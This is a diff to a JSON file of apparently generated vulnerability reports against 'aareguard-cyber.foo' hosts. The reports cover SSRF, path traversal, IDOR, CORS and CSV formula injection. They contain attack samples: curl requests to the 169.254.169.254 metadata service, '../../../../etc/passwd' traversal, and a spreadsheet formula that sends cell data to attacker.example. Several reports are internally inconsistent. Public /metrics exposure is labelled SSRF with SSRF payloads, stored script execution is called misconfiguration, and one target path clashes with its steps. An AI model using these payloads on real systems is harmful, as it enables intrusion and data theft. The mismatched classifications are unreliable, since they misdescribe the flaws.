+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8152,7 +8213,8 @@
           "offset": "3d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8268,7 +8330,8 @@
           "offset": "3d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8391,7 +8454,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8519,7 +8583,8 @@
           "offset": "19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8683,7 +8748,8 @@
           "offset": "5d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8802,7 +8868,8 @@
           "offset": "4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.aareguard-cyber.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8932,7 +8999,8 @@
           "offset": "6d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9071,7 +9139,8 @@
           "offset": "4d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9183,7 +9252,8 @@
           "offset": "1d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.aareguard-cyber.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9294,7 +9364,8 @@
           "offset": "2d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9469,7 +9540,8 @@
           "offset": "5d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9605,7 +9677,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9769,7 +9842,8 @@
           "offset": "7d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.aareguard-cyber.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9893,7 +9967,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10032,7 +10107,8 @@
           "offset": "6d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.aareguard-cyber.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10204,7 +10280,8 @@
           "offset": "8d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10327,7 +10404,8 @@
           "offset": "2d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10434,7 +10512,8 @@
           "offset": "6d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10528,7 +10607,8 @@
           "offset": "2d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10634,7 +10714,8 @@
           "offset": "3d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10765,7 +10846,8 @@
           "offset": "6d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10865,7 +10947,8 @@
           "offset": "3d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11009,7 +11092,8 @@
           "offset": "3d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11148,7 +11232,8 @@
           "offset": "4d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11300,7 +11385,8 @@
           "offset": "2d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11382,7 +11468,8 @@
           "offset": "11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11494,7 +11581,8 @@
           "offset": "4d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11666,7 +11754,8 @@
           "offset": "5d",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11785,7 +11874,8 @@
           "offset": "9d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11939,7 +12029,8 @@
           "offset": "7d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12086,7 +12177,8 @@
           "offset": "7d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
